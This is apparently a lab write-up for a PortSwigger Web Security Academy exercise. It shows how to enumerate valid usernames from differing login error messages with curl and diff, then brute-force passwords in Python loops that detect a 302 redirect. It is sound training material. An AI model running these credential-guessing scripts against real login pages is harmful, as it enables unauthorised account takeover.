To streamline the process, we can first export the environment variable for the target URL:
```
export TARGET="https://<random-url>.web-security-academy.net"
```

To interact with a login form programmatically, we first need to identify the name attributes of the username and password input fields. These attributes tell us what parameters to send in our requests.

We can use curl to fetch the raw HTML of the login page and extract the relevant form elements:

```bash
curl -s $TARGET/login | grep -E "<form|<input"
```
Even when submitting incorrect credentials, the server might always return a 200 OK status. However, differences in the response body can still reveal whether a username is valid. To analyze these variations, we can compare responses using `curl` and `diff`.

```bash
diff <(echo "$(curl -s -X POST "$TARGET/login" -d "username=test&password=test")") \
     <(echo "$(curl -s "$TARGET/login")")
```

```
<                         <p class=is-warning>Invalid username</p>
```
This response suggests that application might give different response if we use correct username. We can automate the process with Python. Full code available [here](https://github.com/fkielpinski/PortswiggerAcademy/blob/main/username_enumeration_via_different_responses/).

```python
for username in usernames:
    data = {
        "username":f"{username}",
        "password":"test"
    }

    response = requests.post(url=url, data=data)

    if "Invalid username" in response.text:
        print("Username is invalid")
    else:
        print(f"Valid username is {username}")
```

After identifying the vulnerability (i.e., the application providing different responses for valid and invalid usernames), we can repeat the steps for password enumeration focusing on different HTTP status code. This process is similar to username enumeration, but we will now focus on the password field, attempting to find a valid password for a given valid username.

```
for password in passwords:
                data = {
                        "username": f"{username}",
                        "password": f"{password}"
                }
                response = requests.post(url=url, data=data, allow_redirects=False)
                if response.status_code == 302:
                    print(f"Redirected to {response.headers['Location']}")
                    return username, password
```

